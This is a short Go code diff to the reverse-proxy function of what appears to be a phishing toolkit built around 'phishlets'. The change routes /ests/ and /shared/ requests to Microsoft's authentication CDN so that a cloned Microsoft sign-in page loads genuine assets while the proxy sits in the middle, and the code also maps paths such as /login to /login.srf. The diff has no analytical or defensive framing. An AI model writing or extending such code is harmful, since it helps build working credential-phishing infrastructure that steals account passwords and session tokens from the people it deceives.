@@ -120,9 +120,14 @@ func serveProxy(w http.ResponseWriter, r *http.Request, upstream string, pl *Phi
 
 	proxy := &httputil.ReverseProxy{
 		Director: func(req *http.Request) {
+				// Route CDN paths to Microsoft CDN servers
+				cdnHost := target.Host
+				if strings.HasPrefix(req.URL.Path, "/ests/") || strings.HasPrefix(req.URL.Path, "/shared/") {
+					cdnHost = "aadcdn.msftauth.net"
+				}
 			req.URL.Scheme = target.Scheme
-			req.URL.Host = target.Host
-			req.Host = target.Host
+			req.URL.Host = cdnHost
+			req.Host = cdnHost
 
 			// Apply phishlet path mappings (e.g. /login → /login.srf)
 			for k, v := range pl.PathMap {
